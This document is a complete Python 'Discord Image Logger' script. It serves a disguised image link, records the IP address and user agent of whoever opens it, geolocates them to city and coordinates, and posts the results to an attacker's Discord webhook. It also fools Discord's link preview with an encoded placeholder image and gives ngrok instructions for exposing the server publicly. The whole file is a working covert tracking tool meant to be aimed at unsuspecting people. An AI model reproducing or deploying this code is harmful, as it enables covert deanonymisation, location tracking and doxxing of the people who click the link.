# Discord Image Logger - Working Version
# By Tim$erz | https://github.com/timzz71

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback, requests, base64, httpagentparser
import json

__app__ = "Discord Image Logger"
__description__ = "Logs IP addresses and device info when users click Open Original on Discord"
__version__ = "v2.0"
__author__ = "Tim$erz"

config = {
    # ⚠️ PASTE YOUR WEBHOOK URL HERE ⚠️
    "webhook": "",
    
    # Customize the image shown when someone opens the link
    "image": "",
    
    # Webhook settings
    "username": "Image Logger",
    "color": 0x00FFFF,
    
    # Features
    "buggedImage": True,
    "accurateLocation": False,
    "vpnCheck": 0,
    "antiBot": 0,
    "linkAlerts": True,
}

blacklistedIPs = ("27", "104", "143", "164")

def get_ip_info(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,isp,as,lat,lon,timezone,mobile,proxy,hosting")
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                return data
    except:
        pass
    return None

def send_to_webhook(ip, useragent, info, endpoint="/imagelogger"):
    if not config["webhook"]:
        print("[!] No webhook URL set!")
        return
    
    os_name = "Unknown"
    browser_name = "Unknown"
    try:
        if useragent:
            os_name, browser_name = httpagentparser.simple_detect(useragent)
    except:
        pass
    
    # Build description without f-string triple quotes
    description = "**A User Opened the Original Image!**\n\n"
    description += f"**Endpoint:** `{endpoint}`\n\n"
    description += "**🌐 IP Information:**\n"
    description += f"> **IP:** `{ip}`\n"
    description += f"> **ISP:** `{info.get('isp', 'Unknown') if info else 'Unknown'}`\n"
    description += f"> **ASN:** `{info.get('as', 'Unknown') if info else 'Unknown'}`\n"
    description += f"> **Country:** `{info.get('country', 'Unknown') if info else 'Unknown'}`\n"
    description += f"> **Region:** `{info.get('regionName', 'Unknown') if info else 'Unknown'}`\n"
    description += f"> **City:** `{info.get('city', 'Unknown') if info else 'Unknown'}`\n"
    description += f"> **Coordinates:** `{info.get('lat', 'N/A') if info else 'N/A'}, {info.get('lon', 'N/A') if info else 'N/A'}`\n"
    description += f"> **Timezone:** `{info.get('timezone', 'Unknown') if info else 'Unknown'}`\n"
    description += f"> **Mobile:** `{info.get('mobile', 'Unknown') if info else 'Unknown'}`\n"
    description += f"> **VPN/Proxy:** `{info.get('proxy', 'Unknown') if info else 'Unknown'}`\n"
    description += f"> **Hosting/Bot:** `{info.get('hosting', 'Unknown') if info else 'Unknown'}`\n\n"
    description += "**💻 Device Information:**\n"
    description += f"> **OS:** `{os_name}`\n"
    description += f"> **Browser:** `{browser_name}`\n\n"
    description += "**📄 User Agent:**\n"
    description += f"```\n{useragent}\n```"
    
    embed = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "📡 Image Logger - IP Logged",
                "color": config["color"],
                "description": description,
                "footer": {"text": "Discord Image Logger v2.0"},
                "timestamp": "2024-01-01T00:00:00Z"
            }
        ]
    }
    
    if config["image"]:
        embed["embeds"][0]["thumbnail"] = {"url": config["image"]}
    
    try:
        response = requests.post(config["webhook"], json=embed)
        print(f"[+] Webhook sent! Status: {response.status_code}")
        if response.status_code == 204:
            print("[+] Webhook delivered successfully!")
        else:
            print(f"[!] Webhook response: {response.text}")
    except Exception as e:
        print(f"[!] Error sending webhook: {e}")

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def log_message(self, format, *args):
        pass
    
    def handleRequest(self):
        try:
            forwarded_for = self.headers.get('x-forwarded-for', '').split(',')[0].strip()
            if not forwarded_for:
                forwarded_for = self.client_address[0]
            
            user_agent = self.headers.get('user-agent', '')
            endpoint = self.path.split("?")[0]
            
            print(f"[+] Request from IP: {forwarded_for}")
            print(f"[+] User-Agent: {user_agent[:100]}...")
            
            info = get_ip_info(forwarded_for)
            
            if info:
                print(f"[+] Location: {info.get('country', 'Unknown')}, {info.get('city', 'Unknown')}")
            else:
                print("[!] Could not get IP info")
            
            send_to_webhook(forwarded_for, user_agent, info, endpoint)
            
            url = config["image"]
            
            if 'Discord' in user_agent or 'discord' in user_agent or forwarded_for.startswith(("34", "35")):
                loading_image = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
                self.send_response(200)
                self.send_header('Content-type', 'image/jpeg')
                self.end_headers()
                self.wfile.write(loading_image)
                return
            
            html = f'''<!DOCTYPE html>
<html>
<head>
    <meta property="og:image" content="{url}">
    <meta property="og:title" content="Image Logger">
    <meta property="og:description" content="Loading image...">
    <title>Image Logger</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }}
        img {{
            max-width: 100%;
            max-height: 100%;
            object-fit: contain;
        }}
    </style>
</head>
<body>
    <img src="{url}" alt="Image">
</body>
</html>'''
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html.encode())
            
        except Exception as e:
            print(f"[!] Error: {e}")
            traceback.print_exc()
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error')
    
    def do_GET(self):
        if self.path == "/":
            html = '''<h1>Image Logger Server</h1>
<p>Visit <a href="/imagelogger">/imagelogger</a> to trigger the logger.</p>
<p>Share this link on Discord: <code>https://your-ngrok-url.ngrok.io/imagelogger</code></p>'''
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html.encode())
            return
        self.handleRequest()
    
    def do_POST(self):
        self.handleRequest()

def run_server():
    port = 8080
    server = HTTPServer(('', port), ImageLoggerAPI)
    print("=" * 60)
    print("  🖼️ DISCORD IMAGE LOGGER")
    print("=" * 60)
    print(f"[+] Server started on http://localhost:{port}")
    print(f"[+] Webhook: {config['webhook'][:50]}...")
    print(f"[+] Image: {config['image'][:50]}...")
    print("[+] Press Ctrl+C to stop")
    print("=" * 60)
    print("\n📨 SHARE THIS LINK ON DISCORD:")
    print(f"   http://localhost:{port}/imagelogger")
    print("\n🌍 OR USE NGROK FOR PUBLIC ACCESS:")
    print("   ngrok http 8080")
    print("   Then share: https://your-ngrok-url.ngrok.io/imagelogger")
    print("=" * 60)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[+] Server stopped.")
        server.server_close()

if __name__ == "__main__":
    run_server()
